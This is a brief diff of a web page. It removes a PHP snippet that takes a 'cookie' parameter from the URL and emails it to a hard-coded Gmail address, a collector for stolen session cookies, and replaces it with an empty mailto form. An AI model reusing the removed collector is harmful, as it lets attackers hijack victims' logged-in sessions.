@@ -1,10 +1,7 @@
 <!DOCTYPE html>
 <head></head>
 <body>
-<?php
-    $message = wordwrap($_GET["cookie"], 69, "\r\n");
-    $subject = $_GET["name"];
-    mail( 'pie.tastes.good.314@gmail.com', 'cookie from' . $subject, $message);
-    echo 'hi';
-?>
+<form method="post" action="mailto:youremail@youremail.com" >
+<input type="submit" value="idk" /> 
+</form>
 </body>
